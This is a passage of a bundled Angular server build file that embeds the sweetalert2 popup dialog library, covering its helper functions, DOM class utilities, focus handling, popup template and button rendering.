import './polyfills.server.mjs';
import {
  ActivatedRoute,
  BrowserAnimationsModule,
  BrowserModule,
  CSP_NONCE,
  CommonModule,
  DOCUMENT,
  ElementRef,
  EventEmitter,
  HttpClient,
  HttpClientModule,
  HttpHeaders,
  InjectionToken,
  NgForOf,
  NgIf,
  NgZone,
  Observable,
  PLATFORM_ID,
  Renderer2,
  Router,
  RouterLink,
  RouterModule,
  RouterOutlet,
  RuntimeError,
  ServerModule,
  Subject,
  Version,
  catchError,
  combineLatest,
  concat,
  debounceTime,
  forkJoin,
  forwardRef,
  from,
  getDOM,
  inject,
  isPlatformBrowser,
  isPromise,
  isSubscribable,
  map,
  of,
  provideClientHydration,
  skip,
  startWith,
  take,
  takeUntil,
  tap,
  throwError,
  ɵɵInheritDefinitionFeature,
  ɵɵNgOnChangesFeature,
  ɵɵProvidersFeature,
  ɵɵadvance,
  ɵɵclassMap,
  ɵɵclassProp,
  ɵɵdefineComponent,
  ɵɵdefineDirective,
  ɵɵdefineInjectable,
  ɵɵdefineInjector,
  ɵɵdefineNgModule,
  ɵɵdirectiveInject,
  ɵɵelement,
  ɵɵelementEnd,
  ɵɵelementStart,
  ɵɵgetCurrentView,
  ɵɵgetInheritedFactory,
  ɵɵinject,
  ɵɵlistener,
  ɵɵnextContext,
  ɵɵproperty,
  ɵɵpureFunction0,
  ɵɵresetView,
  ɵɵrestoreView,
  ɵɵtemplate,
  ɵɵtext,
  ɵɵtextInterpolate
} from "./chunk-YH44A7OS.mjs";
import {
  __commonJS,
  __spreadProps,
  __spreadValues,
  __toESM
} from "./chunk-MD6NWHS6.mjs";

// node_modules/sweetalert2/dist/sweetalert2.all.js
var require_sweetalert2_all = __commonJS({
  "node_modules/sweetalert2/dist/sweetalert2.all.js"(exports, module) {
    "use strict";
    (function(global, factory) {
      typeof exports === "object" && typeof module !== "undefined" ? module.exports = factory() : typeof define === "function" && define.amd ? define(factory) : (global = typeof globalThis !== "undefined" ? globalThis : global || self, global.Sweetalert2 = factory());
    })(exports, function() {
      "use strict";
      function _iterableToArrayLimit(r, l) {
        var t = null == r ? null : "undefined" != typeof Symbol && r[Symbol.iterator] || r["@@iterator"];
        if (null != t) {
          var e, n, i, u, a = [], f = true, o = false;
          try {
            if (i = (t = t.call(r)).next, 0 === l) {
              if (Object(t) !== t)
                return;
              f = false;
            } else
              for (; !(f = (e = i.call(t)).done) && (a.push(e.value), a.length !== l); f = true)
                ;
          } catch (r2) {
            o = true, n = r2;
          } finally {
            try {
              if (!f && null != t.return && (u = t.return(), Object(u) !== u))
                return;
            } finally {
              if (o)
                throw n;
            }
          }
          return a;
        }
      }
      function _typeof(o) {
        "@babel/helpers - typeof";
        return _typeof = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function(o2) {
          return typeof o2;
        } : function(o2) {
          return o2 && "function" == typeof Symbol && o2.constructor === Symbol && o2 !== Symbol.prototype ? "symbol" : typeof o2;
        }, _typeof(o);
      }
      function _classCallCheck(instance, Constructor) {
        if (!(instance instanceof Constructor)) {
          throw new TypeError("Cannot call a class as a function");
        }
      }
      function _defineProperties(target, props) {
        for (var i = 0; i < props.length; i++) {
          var descriptor = props[i];
          descriptor.enumerable = descriptor.enumerable || false;
          descriptor.configurable = true;
          if ("value" in descriptor)
            descriptor.writable = true;
          Object.defineProperty(target, _toPropertyKey(descriptor.key), descriptor);
        }
      }
      function _createClass(Constructor, protoProps, staticProps) {
        if (protoProps)
          _defineProperties(Constructor.prototype, protoProps);
        if (staticProps)
          _defineProperties(Constructor, staticProps);
        Object.defineProperty(Constructor, "prototype", {
          writable: false
        });
        return Constructor;
      }
      function _inherits(subClass, superClass) {
        if (typeof superClass !== "function" && superClass !== null) {
          throw new TypeError("Super expression must either be null or a function");
        }
        subClass.prototype = Object.create(superClass && superClass.prototype, {
          constructor: {
            value: subClass,
            writable: true,
            configurable: true
          }
        });
        Object.defineProperty(subClass, "prototype", {
          writable: false
        });
        if (superClass)
          _setPrototypeOf(subClass, superClass);
      }
      function _getPrototypeOf(o) {
        _getPrototypeOf = Object.setPrototypeOf ? Object.getPrototypeOf.bind() : function _getPrototypeOf2(o2) {
          return o2.__proto__ || Object.getPrototypeOf(o2);
        };
        return _getPrototypeOf(o);
      }
      function _setPrototypeOf(o, p) {
        _setPrototypeOf = Object.setPrototypeOf ? Object.setPrototypeOf.bind() : function _setPrototypeOf2(o2, p2) {
          o2.__proto__ = p2;
          return o2;
        };
        return _setPrototypeOf(o, p);
      }
      function _isNativeReflectConstruct() {
        if (typeof Reflect === "undefined" || !Reflect.construct)
          return false;
        if (Reflect.construct.sham)
          return false;
        if (typeof Proxy === "function")
          return true;
        try {
          Boolean.prototype.valueOf.call(Reflect.construct(Boolean, [], function() {
          }));
          return true;
        } catch (e) {
          return false;
        }
      }
      function _construct(Parent, args, Class) {
        if (_isNativeReflectConstruct()) {
          _construct = Reflect.construct.bind();
        } else {
          _construct = function _construct2(Parent2, args2, Class2) {
            var a = [null];
            a.push.apply(a, args2);
            var Constructor = Function.bind.apply(Parent2, a);
            var instance = new Constructor();
            if (Class2)
              _setPrototypeOf(instance, Class2.prototype);
            return instance;
          };
        }
        return _construct.apply(null, arguments);
      }
      function _assertThisInitialized(self2) {
        if (self2 === void 0) {
          throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
        }
        return self2;
      }
      function _possibleConstructorReturn(self2, call) {
        if (call && (typeof call === "object" || typeof call === "function")) {
          return call;
        } else if (call !== void 0) {
          throw new TypeError("Derived constructors may only return object or undefined");
        }
        return _assertThisInitialized(self2);
      }
      function _createSuper(Derived) {
        var hasNativeReflectConstruct = _isNativeReflectConstruct();
        return function _createSuperInternal() {
          var Super = _getPrototypeOf(Derived), result;
          if (hasNativeReflectConstruct) {
            var NewTarget = _getPrototypeOf(this).constructor;
            result = Reflect.construct(Super, arguments, NewTarget);
          } else {
            result = Super.apply(this, arguments);
          }
          return _possibleConstructorReturn(this, result);
        };
      }
      function _superPropBase(object, property) {
        while (!Object.prototype.hasOwnProperty.call(object, property)) {
          object = _getPrototypeOf(object);
          if (object === null)
            break;
        }
        return object;
      }
      function _get() {
        if (typeof Reflect !== "undefined" && Reflect.get) {
          _get = Reflect.get.bind();
        } else {
          _get = function _get2(target, property, receiver) {
            var base = _superPropBase(target, property);
            if (!base)
              return;
            var desc = Object.getOwnPropertyDescriptor(base, property);
            if (desc.get) {
              return desc.get.call(arguments.length < 3 ? target : receiver);
            }
            return desc.value;
          };
        }
        return _get.apply(this, arguments);
      }
      function _slicedToArray(arr, i) {
        return _arrayWithHoles(arr) || _iterableToArrayLimit(arr, i) || _unsupportedIterableToArray(arr, i) || _nonIterableRest();
      }
      function _toConsumableArray(arr) {
        return _arrayWithoutHoles(arr) || _iterableToArray(arr) || _unsupportedIterableToArray(arr) || _nonIterableSpread();
      }
      function _arrayWithoutHoles(arr) {
        if (Array.isArray(arr))
          return _arrayLikeToArray(arr);
      }
      function _arrayWithHoles(arr) {
        if (Array.isArray(arr))
          return arr;
      }
      function _iterableToArray(iter) {
        if (typeof Symbol !== "undefined" && iter[Symbol.iterator] != null || iter["@@iterator"] != null)
          return Array.from(iter);
      }
      function _unsupportedIterableToArray(o, minLen) {
        if (!o)
          return;
        if (typeof o === "string")
          return _arrayLikeToArray(o, minLen);
        var n = Object.prototype.toString.call(o).slice(8, -1);
        if (n === "Object" && o.constructor)
          n = o.constructor.name;
        if (n === "Map" || n === "Set")
          return Array.from(o);
        if (n === "Arguments" || /^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(n))
          return _arrayLikeToArray(o, minLen);
      }
      function _arrayLikeToArray(arr, len) {
        if (len == null || len > arr.length)
          len = arr.length;
        for (var i = 0, arr2 = new Array(len); i < len; i++)
          arr2[i] = arr[i];
        return arr2;
      }
      function _nonIterableSpread() {
        throw new TypeError("Invalid attempt to spread non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.");
      }
      function _nonIterableRest() {
        throw new TypeError("Invalid attempt to destructure non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.");
      }
      function _toPrimitive(input, hint) {
        if (typeof input !== "object" || input === null)
          return input;
        var prim = input[Symbol.toPrimitive];
        if (prim !== void 0) {
          var res = prim.call(input, hint || "default");
          if (typeof res !== "object")
            return res;
          throw new TypeError("@@toPrimitive must return a primitive value.");
        }
        return (hint === "string" ? String : Number)(input);
      }
      function _toPropertyKey(arg) {
        var key = _toPrimitive(arg, "string");
        return typeof key === "symbol" ? key : String(key);
      }
      function _classPrivateFieldGet(receiver, privateMap) {
        var descriptor = _classExtractFieldDescriptor(receiver, privateMap, "get");
        return _classApplyDescriptorGet(receiver, descriptor);
      }
      function _classPrivateFieldSet(receiver, privateMap, value) {
        var descriptor = _classExtractFieldDescriptor(receiver, privateMap, "set");
        _classApplyDescriptorSet(receiver, descriptor, value);
        return value;
      }
      function _classExtractFieldDescriptor(receiver, privateMap, action) {
        if (!privateMap.has(receiver)) {
          throw new TypeError("attempted to " + action + " private field on non-instance");
        }
        return privateMap.get(receiver);
      }
      function _classApplyDescriptorGet(receiver, descriptor) {
        if (descriptor.get) {
          return descriptor.get.call(receiver);
        }
        return descriptor.value;
      }
      function _classApplyDescriptorSet(receiver, descriptor, value) {
        if (descriptor.set) {
          descriptor.set.call(receiver, value);
        } else {
          if (!descriptor.writable) {
            throw new TypeError("attempted to set read only private field");
          }
          descriptor.value = value;
        }
      }
      function _checkPrivateRedeclaration(obj, privateCollection) {
        if (privateCollection.has(obj)) {
          throw new TypeError("Cannot initialize the same private elements twice on an object");
        }
      }
      function _classPrivateFieldInitSpec(obj, privateMap, value) {
        _checkPrivateRedeclaration(obj, privateMap);
        privateMap.set(obj, value);
      }
      var RESTORE_FOCUS_TIMEOUT = 100;
      var globalState = {};
      var focusPreviousActiveElement = function focusPreviousActiveElement2() {
        if (globalState.previousActiveElement instanceof HTMLElement) {
          globalState.previousActiveElement.focus();
          globalState.previousActiveElement = null;
        } else if (document.body) {
          document.body.focus();
        }
      };
      var restoreActiveElement = function restoreActiveElement2(returnFocus) {
        return new Promise(function(resolve) {
          if (!returnFocus) {
            return resolve();
          }
          var x = window.scrollX;
          var y = window.scrollY;
          globalState.restoreFocusTimeout = setTimeout(function() {
            focusPreviousActiveElement();
            resolve();
          }, RESTORE_FOCUS_TIMEOUT);
          window.scrollTo(x, y);
        });
      };
      var swalPrefix = "swal2-";
      var classNames = ["container", "shown", "height-auto", "iosfix", "popup", "modal", "no-backdrop", "no-transition", "toast", "toast-shown", "show", "hide", "close", "title", "html-container", "actions", "confirm", "deny", "cancel", "default-outline", "footer", "icon", "icon-content", "image", "input", "file", "range", "select", "radio", "checkbox", "label", "textarea", "inputerror", "input-label", "validation-message", "progress-steps", "active-progress-step", "progress-step", "progress-step-line", "loader", "loading", "styled", "top", "top-start", "top-end", "top-left", "top-right", "center", "center-start", "center-end", "center-left", "center-right", "bottom", "bottom-start", "bottom-end", "bottom-left", "bottom-right", "grow-row", "grow-column", "grow-fullscreen", "rtl", "timer-progress-bar", "timer-progress-bar-container", "scrollbar-measure", "icon-success", "icon-warning", "icon-info", "icon-question", "icon-error"];
      var swalClasses = classNames.reduce(
        function(acc, className) {
          acc[className] = swalPrefix + className;
          return acc;
        },
        /** @type {SwalClasses} */
        {}
      );
      var icons = ["success", "warning", "info", "question", "error"];
      var iconTypes = icons.reduce(
        function(acc, icon) {
          acc[icon] = swalPrefix + icon;
          return acc;
        },
        /** @type {SwalIcons} */
        {}
      );
      var consolePrefix = "SweetAlert2:";
      var capitalizeFirstLetter = function capitalizeFirstLetter2(str) {
        return str.charAt(0).toUpperCase() + str.slice(1);
      };
      var warn = function warn2(message) {
        console.warn("".concat(consolePrefix, " ").concat(_typeof(message) === "object" ? message.join(" ") : message));
      };
      var error = function error2(message) {
        console.error("".concat(consolePrefix, " ").concat(message));
      };
      var previousWarnOnceMessages = [];
      var warnOnce = function warnOnce2(message) {
        if (!previousWarnOnceMessages.includes(message)) {
          previousWarnOnceMessages.push(message);
          warn(message);
        }
      };
      var warnAboutDeprecation = function warnAboutDeprecation2(deprecatedParam, useInstead) {
        warnOnce('"'.concat(deprecatedParam, '" is deprecated and will be removed in the next major release. Please use "').concat(useInstead, '" instead.'));
      };
      var callIfFunction = function callIfFunction2(arg) {
        return typeof arg === "function" ? arg() : arg;
      };
      var hasToPromiseFn = function hasToPromiseFn2(arg) {
        return arg && typeof arg.toPromise === "function";
      };
      var asPromise = function asPromise2(arg) {
        return hasToPromiseFn(arg) ? arg.toPromise() : Promise.resolve(arg);
      };
      var isPromise2 = function isPromise3(arg) {
        return arg && Promise.resolve(arg) === arg;
      };
      var getContainer = function getContainer2() {
        return document.body.querySelector(".".concat(swalClasses.container));
      };
      var elementBySelector = function elementBySelector2(selectorString) {
        var container = getContainer();
        return container ? container.querySelector(selectorString) : null;
      };
      var elementByClass = function elementByClass2(className) {
        return elementBySelector(".".concat(className));
      };
      var getPopup = function getPopup2() {
        return elementByClass(swalClasses.popup);
      };
      var getIcon = function getIcon2() {
        return elementByClass(swalClasses.icon);
      };
      var getIconContent = function getIconContent2() {
        return elementByClass(swalClasses["icon-content"]);
      };
      var getTitle = function getTitle2() {
        return elementByClass(swalClasses.title);
      };
      var getHtmlContainer = function getHtmlContainer2() {
        return elementByClass(swalClasses["html-container"]);
      };
      var getImage = function getImage2() {
        return elementByClass(swalClasses.image);
      };
      var getProgressSteps = function getProgressSteps2() {
        return elementByClass(swalClasses["progress-steps"]);
      };
      var getValidationMessage = function getValidationMessage2() {
        return elementByClass(swalClasses["validation-message"]);
      };
      var getConfirmButton = function getConfirmButton2() {
        return (
          /** @type {HTMLButtonElement} */
          elementBySelector(".".concat(swalClasses.actions, " .").concat(swalClasses.confirm))
        );
      };
      var getCancelButton = function getCancelButton2() {
        return (
          /** @type {HTMLButtonElement} */
          elementBySelector(".".concat(swalClasses.actions, " .").concat(swalClasses.cancel))
        );
      };
      var getDenyButton = function getDenyButton2() {
        return (
          /** @type {HTMLButtonElement} */
          elementBySelector(".".concat(swalClasses.actions, " .").concat(swalClasses.deny))
        );
      };
      var getInputLabel = function getInputLabel2() {
        return elementByClass(swalClasses["input-label"]);
      };
      var getLoader = function getLoader2() {
        return elementBySelector(".".concat(swalClasses.loader));
      };
      var getActions = function getActions2() {
        return elementByClass(swalClasses.actions);
      };
      var getFooter = function getFooter2() {
        return elementByClass(swalClasses.footer);
      };
      var getTimerProgressBar = function getTimerProgressBar2() {
        return elementByClass(swalClasses["timer-progress-bar"]);
      };
      var getCloseButton = function getCloseButton2() {
        return elementByClass(swalClasses.close);
      };
      var focusable = '\n  a[href],\n  area[href],\n  input:not([disabled]),\n  select:not([disabled]),\n  textarea:not([disabled]),\n  button:not([disabled]),\n  iframe,\n  object,\n  embed,\n  [tabindex="0"],\n  [contenteditable],\n  audio[controls],\n  video[controls],\n  summary\n';
      var getFocusableElements = function getFocusableElements2() {
        var popup = getPopup();
        if (!popup) {
          return [];
        }
        var focusableElementsWithTabindex = popup.querySelectorAll('[tabindex]:not([tabindex="-1"]):not([tabindex="0"])');
        var focusableElementsWithTabindexSorted = Array.from(focusableElementsWithTabindex).sort(function(a, b) {
          var tabindexA = parseInt(a.getAttribute("tabindex") || "0");
          var tabindexB = parseInt(b.getAttribute("tabindex") || "0");
          if (tabindexA > tabindexB) {
            return 1;
          } else if (tabindexA < tabindexB) {
            return -1;
          }
          return 0;
        });
        var otherFocusableElements = popup.querySelectorAll(focusable);
        var otherFocusableElementsFiltered = Array.from(otherFocusableElements).filter(function(el) {
          return el.getAttribute("tabindex") !== "-1";
        });
        return _toConsumableArray(new Set(focusableElementsWithTabindexSorted.concat(otherFocusableElementsFiltered))).filter(function(el) {
          return isVisible$1(el);
        });
      };
      var isModal = function isModal2() {
        return hasClass(document.body, swalClasses.shown) && !hasClass(document.body, swalClasses["toast-shown"]) && !hasClass(document.body, swalClasses["no-backdrop"]);
      };
      var isToast = function isToast2() {
        var popup = getPopup();
        if (!popup) {
          return false;
        }
        return hasClass(popup, swalClasses.toast);
      };
      var isLoading = function isLoading2() {
        var popup = getPopup();
        if (!popup) {
          return false;
        }
        return popup.hasAttribute("data-loading");
      };
      var setInnerHtml = function setInnerHtml2(elem, html) {
        elem.textContent = "";
        if (html) {
          var parser = new DOMParser();
          var parsed = parser.parseFromString(html, "text/html");
          var head = parsed.querySelector("head");
          head && Array.from(head.childNodes).forEach(function(child) {
            elem.appendChild(child);
          });
          var body = parsed.querySelector("body");
          body && Array.from(body.childNodes).forEach(function(child) {
            if (child instanceof HTMLVideoElement || child instanceof HTMLAudioElement) {
              elem.appendChild(child.cloneNode(true));
            } else {
              elem.appendChild(child);
            }
          });
        }
      };
      var hasClass = function hasClass2(elem, className) {
        if (!className) {
          return false;
        }
        var classList = className.split(/\s+/);
        for (var i = 0; i < classList.length; i++) {
          if (!elem.classList.contains(classList[i])) {
            return false;
          }
        }
        return true;
      };
      var removeCustomClasses = function removeCustomClasses2(elem, params) {
        Array.from(elem.classList).forEach(function(className) {
          if (!Object.values(swalClasses).includes(className) && !Object.values(iconTypes).includes(className) && !Object.values(params.showClass || {}).includes(className)) {
            elem.classList.remove(className);
          }
        });
      };
      var applyCustomClass = function applyCustomClass2(elem, params, className) {
        removeCustomClasses(elem, params);
        if (params.customClass && params.customClass[className]) {
          if (typeof params.customClass[className] !== "string" && !params.customClass[className].forEach) {
            warn("Invalid type of customClass.".concat(className, '! Expected string or iterable object, got "').concat(_typeof(params.customClass[className]), '"'));
            return;
          }
          addClass(elem, params.customClass[className]);
        }
      };
      var getInput$1 = function getInput2(popup, inputClass) {
        if (!inputClass) {
          return null;
        }
        switch (inputClass) {
          case "select":
          case "textarea":
          case "file":
            return popup.querySelector(".".concat(swalClasses.popup, " > .").concat(swalClasses[inputClass]));
          case "checkbox":
            return popup.querySelector(".".concat(swalClasses.popup, " > .").concat(swalClasses.checkbox, " input"));
          case "radio":
            return popup.querySelector(".".concat(swalClasses.popup, " > .").concat(swalClasses.radio, " input:checked")) || popup.querySelector(".".concat(swalClasses.popup, " > .").concat(swalClasses.radio, " input:first-child"));
          case "range":
            return popup.querySelector(".".concat(swalClasses.popup, " > .").concat(swalClasses.range, " input"));
          default:
            return popup.querySelector(".".concat(swalClasses.popup, " > .").concat(swalClasses.input));
        }
      };
      var focusInput = function focusInput2(input) {
        input.focus();
        if (input.type !== "file") {
          var val = input.value;
          input.value = "";
          input.value = val;
        }
      };
      var toggleClass = function toggleClass2(target, classList, condition) {
        if (!target || !classList) {
          return;
        }
        if (typeof classList === "string") {
          classList = classList.split(/\s+/).filter(Boolean);
        }
        classList.forEach(function(className) {
          if (Array.isArray(target)) {
            target.forEach(function(elem) {
              condition ? elem.classList.add(className) : elem.classList.remove(className);
            });
          } else {
            condition ? target.classList.add(className) : target.classList.remove(className);
          }
        });
      };
      var addClass = function addClass2(target, classList) {
        toggleClass(target, classList, true);
      };
      var removeClass = function removeClass2(target, classList) {
        toggleClass(target, classList, false);
      };
      var getDirectChildByClass = function getDirectChildByClass2(elem, className) {
        var children = Array.from(elem.children);
        for (var i = 0; i < children.length; i++) {
          var child = children[i];
          if (child instanceof HTMLElement && hasClass(child, className)) {
            return child;
          }
        }
      };
      var applyNumericalStyle = function applyNumericalStyle2(elem, property, value) {
        if (value === "".concat(parseInt(value))) {
          value = parseInt(value);
        }
        if (value || parseInt(value) === 0) {
          elem.style[property] = typeof value === "number" ? "".concat(value, "px") : value;
        } else {
          elem.style.removeProperty(property);
        }
      };
      var show = function show2(elem) {
        var display = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : "flex";
        elem && (elem.style.display = display);
      };
      var hide = function hide2(elem) {
        elem && (elem.style.display = "none");
      };
      var showWhenInnerHtmlPresent = function showWhenInnerHtmlPresent2(elem) {
        var display = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : "block";
        if (!elem) {
          return;
        }
        new MutationObserver(function() {
          toggle(elem, elem.innerHTML, display);
        }).observe(elem, {
          childList: true,
          subtree: true
        });
      };
      var setStyle = function setStyle2(parent, selector, property, value) {
        var el = parent.querySelector(selector);
        if (el) {
          el.style[property] = value;
        }
      };
      var toggle = function toggle2(elem, condition) {
        var display = arguments.length > 2 && arguments[2] !== void 0 ? arguments[2] : "flex";
        condition ? show(elem, display) : hide(elem);
      };
      var isVisible$1 = function isVisible2(elem) {
        return !!(elem && (elem.offsetWidth || elem.offsetHeight || elem.getClientRects().length));
      };
      var allButtonsAreHidden = function allButtonsAreHidden2() {
        return !isVisible$1(getConfirmButton()) && !isVisible$1(getDenyButton()) && !isVisible$1(getCancelButton());
      };
      var isScrollable = function isScrollable2(elem) {
        return !!(elem.scrollHeight > elem.clientHeight);
      };
      var hasCssAnimation = function hasCssAnimation2(elem) {
        var style = window.getComputedStyle(elem);
        var animDuration = parseFloat(style.getPropertyValue("animation-duration") || "0");
        var transDuration = parseFloat(style.getPropertyValue("transition-duration") || "0");
        return animDuration > 0 || transDuration > 0;
      };
      var animateTimerProgressBar = function animateTimerProgressBar2(timer) {
        var reset = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : false;
        var timerProgressBar = getTimerProgressBar();
        if (!timerProgressBar) {
          return;
        }
        if (isVisible$1(timerProgressBar)) {
          if (reset) {
            timerProgressBar.style.transition = "none";
            timerProgressBar.style.width = "100%";
          }
          setTimeout(function() {
            timerProgressBar.style.transition = "width ".concat(timer / 1e3, "s linear");
            timerProgressBar.style.width = "0%";
          }, 10);
        }
      };
      var stopTimerProgressBar = function stopTimerProgressBar2() {
        var timerProgressBar = getTimerProgressBar();
        if (!timerProgressBar) {
          return;
        }
        var timerProgressBarWidth = parseInt(window.getComputedStyle(timerProgressBar).width);
        timerProgressBar.style.removeProperty("transition");
        timerProgressBar.style.width = "100%";
        var timerProgressBarFullWidth = parseInt(window.getComputedStyle(timerProgressBar).width);
        var timerProgressBarPercent = timerProgressBarWidth / timerProgressBarFullWidth * 100;
        timerProgressBar.style.width = "".concat(timerProgressBarPercent, "%");
      };
      var isNodeEnv = function isNodeEnv2() {
        return typeof window === "undefined" || typeof document === "undefined";
      };
      var sweetHTML = '\n <div aria-labelledby="'.concat(swalClasses.title, '" aria-describedby="').concat(swalClasses["html-container"], '" class="').concat(swalClasses.popup, '" tabindex="-1">\n   <button type="button" class="').concat(swalClasses.close, '"></button>\n   <ul class="').concat(swalClasses["progress-steps"], '"></ul>\n   <div class="').concat(swalClasses.icon, '"></div>\n   <img class="').concat(swalClasses.image, '" />\n   <h2 class="').concat(swalClasses.title, '" id="').concat(swalClasses.title, '"></h2>\n   <div class="').concat(swalClasses["html-container"], '" id="').concat(swalClasses["html-container"], '"></div>\n   <input class="').concat(swalClasses.input, '" id="').concat(swalClasses.input, '" />\n   <input type="file" class="').concat(swalClasses.file, '" />\n   <div class="').concat(swalClasses.range, '">\n     <input type="range" />\n     <output></output>\n   </div>\n   <select class="').concat(swalClasses.select, '" id="').concat(swalClasses.select, '"></select>\n   <div class="').concat(swalClasses.radio, '"></div>\n   <label class="').concat(swalClasses.checkbox, '">\n     <input type="checkbox" id="').concat(swalClasses.checkbox, '" />\n     <span class="').concat(swalClasses.label, '"></span>\n   </label>\n   <textarea class="').concat(swalClasses.textarea, '" id="').concat(swalClasses.textarea, '"></textarea>\n   <div class="').concat(swalClasses["validation-message"], '" id="').concat(swalClasses["validation-message"], '"></div>\n   <div class="').concat(swalClasses.actions, '">\n     <div class="').concat(swalClasses.loader, '"></div>\n     <button type="button" class="').concat(swalClasses.confirm, '"></button>\n     <button type="button" class="').concat(swalClasses.deny, '"></button>\n     <button type="button" class="').concat(swalClasses.cancel, '"></button>\n   </div>\n   <div class="').concat(swalClasses.footer, '"></div>\n   <div class="').concat(swalClasses["timer-progress-bar-container"], '">\n     <div class="').concat(swalClasses["timer-progress-bar"], '"></div>\n   </div>\n </div>\n').replace(/(^|\n)\s*/g, "");
      var resetOldContainer = function resetOldContainer2() {
        var oldContainer = getContainer();
        if (!oldContainer) {
          return false;
        }
        oldContainer.remove();
        removeClass([document.documentElement, document.body], [swalClasses["no-backdrop"], swalClasses["toast-shown"], swalClasses["has-column"]]);
        return true;
      };
      var resetValidationMessage$1 = function resetValidationMessage2() {
        globalState.currentInstance.resetValidationMessage();
      };
      var addInputChangeListeners = function addInputChangeListeners2() {
        var popup = getPopup();
        var input = getDirectChildByClass(popup, swalClasses.input);
        var file = getDirectChildByClass(popup, swalClasses.file);
        var range = popup.querySelector(".".concat(swalClasses.range, " input"));
        var rangeOutput = popup.querySelector(".".concat(swalClasses.range, " output"));
        var select = getDirectChildByClass(popup, swalClasses.select);
        var checkbox = popup.querySelector(".".concat(swalClasses.checkbox, " input"));
        var textarea = getDirectChildByClass(popup, swalClasses.textarea);
        input.oninput = resetValidationMessage$1;
        file.onchange = resetValidationMessage$1;
        select.onchange = resetValidationMessage$1;
        checkbox.onchange = resetValidationMessage$1;
        textarea.oninput = resetValidationMessage$1;
        range.oninput = function() {
          resetValidationMessage$1();
          rangeOutput.value = range.value;
        };
        range.onchange = function() {
          resetValidationMessage$1();
          rangeOutput.value = range.value;
        };
      };
      var getTarget = function getTarget2(target) {
        return typeof target === "string" ? document.querySelector(target) : target;
      };
      var setupAccessibility = function setupAccessibility2(params) {
        var popup = getPopup();
        popup.setAttribute("role", params.toast ? "alert" : "dialog");
        popup.setAttribute("aria-live", params.toast ? "polite" : "assertive");
        if (!params.toast) {
          popup.setAttribute("aria-modal", "true");
        }
      };
      var setupRTL = function setupRTL2(targetElement) {
        if (window.getComputedStyle(targetElement).direction === "rtl") {
          addClass(getContainer(), swalClasses.rtl);
        }
      };
      var init = function init2(params) {
        var oldContainerExisted = resetOldContainer();
        if (isNodeEnv()) {
          error("SweetAlert2 requires document to initialize");
          return;
        }
        var container = document.createElement("div");
        container.className = swalClasses.container;
        if (oldContainerExisted) {
          addClass(container, swalClasses["no-transition"]);
        }
        setInnerHtml(container, sweetHTML);
        var targetElement = getTarget(params.target);
        targetElement.appendChild(container);
        setupAccessibility(params);
        setupRTL(targetElement);
        addInputChangeListeners();
      };
      var parseHtmlToContainer = function parseHtmlToContainer2(param, target) {
        if (param instanceof HTMLElement) {
          target.appendChild(param);
        } else if (_typeof(param) === "object") {
          handleObject(param, target);
        } else if (param) {
          setInnerHtml(target, param);
        }
      };
      var handleObject = function handleObject2(param, target) {
        if (param.jquery) {
          handleJqueryElem(target, param);
        } else {
          setInnerHtml(target, param.toString());
        }
      };
      var handleJqueryElem = function handleJqueryElem2(target, elem) {
        target.textContent = "";
        if (0 in elem) {
          for (var i = 0; i in elem; i++) {
            target.appendChild(elem[i].cloneNode(true));
          }
        } else {
          target.appendChild(elem.cloneNode(true));
        }
      };
      var animationEndEvent = function() {
        if (isNodeEnv()) {
          return false;
        }
        var testEl = document.createElement("div");
        if (typeof testEl.style.webkitAnimation !== "undefined") {
          return "webkitAnimationEnd";
        }
        if (typeof testEl.style.animation !== "undefined") {
          return "animationend";
        }
        return false;
      }();
      var renderActions = function renderActions2(instance, params) {
        var actions = getActions();
        var loader = getLoader();
        if (!actions || !loader) {
          return;
        }
        if (!params.showConfirmButton && !params.showDenyButton && !params.showCancelButton) {
          hide(actions);
        } else {
          show(actions);
        }
        applyCustomClass(actions, params, "actions");
        renderButtons(actions, loader, params);
        setInnerHtml(loader, params.loaderHtml || "");
        applyCustomClass(loader, params, "loader");
      };
      function renderButtons(actions, loader, params) {
        var confirmButton = getConfirmButton();
        var denyButton = getDenyButton();
        var cancelButton = getCancelButton();
        if (!confirmButton || !denyButton || !cancelButton) {
          return;
        }
        renderButton(confirmButton, "confirm", params);
        renderButton(denyButton, "deny", params);
        renderButton(cancelButton, "cancel", params);
        handleButtonsStyling(confirmButton, denyButton, cancelButton, params);
        if (params.reverseButtons) {
          if (params.toast) {
            actions.insertBefore(cancelButton, confirmButton);
            actions.insertBefore(denyButton, confirmButton);
          } else {
            actions.insertBefore(cancelButton, loader);
            actions.insertBefore(denyButton, loader);
            actions.insertBefore(confirmButton, loader);
          }
        }
      }
      function handleButtonsStyling(confirmButton, denyButton, cancelButton, params) {
        if (!params.buttonsStyling) {
          removeClass([confirmButton, denyButton, cancelButton], swalClasses.styled);
          return;
        }
        addClass([confirmButton, denyButton, cancelButton], swalClasses.styled);
        if (params.confirmButtonColor) {
          confirmButton.style.backgroundColor = params.confirmButtonColor;
          addClass(confirmButton, swalClasses["default-outline"]);
        }
        if (params.denyButtonColor) {
          denyButton.style.backgroundColor = params.denyButtonColor;
          addClass(denyButton, swalClasses["default-outline"]);
        }
        if (params.cancelButtonColor) {
          cancelButton.style.backgroundColor = params.cancelButtonColor;
          addClass(cancelButton, swalClasses["default-outline"]);
        }
      }
      function renderButton(button, buttonType, params) {
        var buttonName = (
          /** @type {'Confirm' | 'Deny' | 'Cancel'} */
          capitalizeFirstLetter(buttonType)
        );
        toggle(button, params["show".concat(buttonName, "Button")], "inline-block");
        setInnerHtml(button, params["".concat(buttonType, "ButtonText")] || "");
        button.setAttribute("aria-label", params["".concat(buttonType, "ButtonAriaLabel")] || "");
        button.className = swalClasses[buttonType];
        applyCustomClass(button, params, "".concat(buttonType, "Button"));
      }
      var renderCloseButton = function renderCloseButton2(instance, params) {
        var closeButton = getCloseButton();
        if (!closeButton) {
          return;
        }
        setInnerHtml(closeButton, params.closeButtonHtml || "");
        applyCustomClass(closeButton, params, "closeButton");
        toggle(closeButton, params.showCloseButton);
        closeButton.setAttribute("aria-label", params.closeButtonAriaLabel || "");
      };
      var renderContainer = function renderContainer2(instance, params) {
        var container = getContainer();
        if (!container) {
          return;
        }
